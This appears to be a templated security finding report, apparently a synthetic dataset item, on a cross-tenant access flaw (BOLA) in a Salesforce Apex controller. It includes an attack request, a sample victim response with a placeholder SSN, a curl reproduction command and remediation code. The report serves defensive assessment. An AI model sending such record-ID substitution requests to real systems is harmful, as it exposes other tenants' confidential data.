# Security Analysis Report
**System:** Aegis Vault Secure Repository (Salesforce-Integrated)
**Domain:** Defense Industrial Base
**Example ID:** SF-0106
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.5 | Multi-tenant cross-tenant access on `CustomObjectController.getRecord` — attacker reads any defense industrial CustomRecord across tenant boundaries |

---

## Finding 1 — BOLA: Multi-Tenant Cross-Tenant Access on CustomRecord Object (Pattern 1.5)

### Summary
The Apex controller `CustomRecordController` on Aegis Vault Secure Repository (`b526e0fc.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the CustomRecord object. Per §5.0 Pattern 1.5, there is no tenant isolation predicate — an attacker can access defense classified CustomRecord objects belonging to users in other tenant contexts by substituting `recordId`.

**Context.txt inconsistency (documented):** The Apex class in §4.0 is `CustomRecordController` with method `getCustomRecordDetails`, but the Aura descriptor in §6.0 is `c.CustomObjectController.getRecord` (different class name). These conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 1.5 — Multi-tenant / cross-tenant access (BOLA)
**Affected controller:** `c.CustomObjectController.getRecord`
**Affected endpoint:** `POST https://b526e0fc.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://b526e0fc.lightning.force.com/aura
Authorization: Bearer 00DB526E0FC!ARb526e0fc...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DB526E0FC!ARb526e0fc...

message={"actions":[{"id":"1;a","descriptor":"c.CustomObjectController.getRecord","callingDescriptor":"UNKNOWN",
"params":{"recordId":"001E0FC","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim CustomRecord Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001E0FC", "Name": "Victim CustomRecord Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-37-4928"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DB526E0FC!ARb526e0fc..."
curl -s -X POST "https://b526e0fc.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.CustomObjectController.getRecord","callingDescriptor":"UNKNOWN","params":{"recordId":"001E0FC","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-37-4928
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class CustomRecordController { ... }`
2. `WHERE Id = :recordId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
